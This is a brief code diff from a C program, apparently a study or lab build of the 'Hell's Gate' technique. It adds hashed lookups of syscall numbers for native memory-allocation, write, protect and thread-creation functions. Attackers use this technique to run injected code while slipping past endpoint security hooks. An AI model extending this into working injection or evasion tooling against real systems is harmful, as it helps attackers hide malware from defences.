@@ -78,6 +78,22 @@ int main(int argc, char* argv[])
 	printf("[+] Successfully parsed the export directory at address %p\n", pImgExportDir);
 	printf("[+] Successfully retrieved function names, addresses and ordinals\n");
 
+	//populate VX_TABLE
+	//initialize the hashes we need to check for, if found we save the SSN
+	printf("[+] Initializing VX_TABLE values\n");
+	VX_TABLE Table = { 0 };
+	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
+	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
+	Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
+	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
+	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
+
+	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtAllocateVirtualMemory, pExportData))
+	{
+		fprintf(stderr, "[!] Error with GetVxTableEntry...\n");
+		exit(-1);
+	}
+
 	//for attaching a debugger
 	getchar();
 
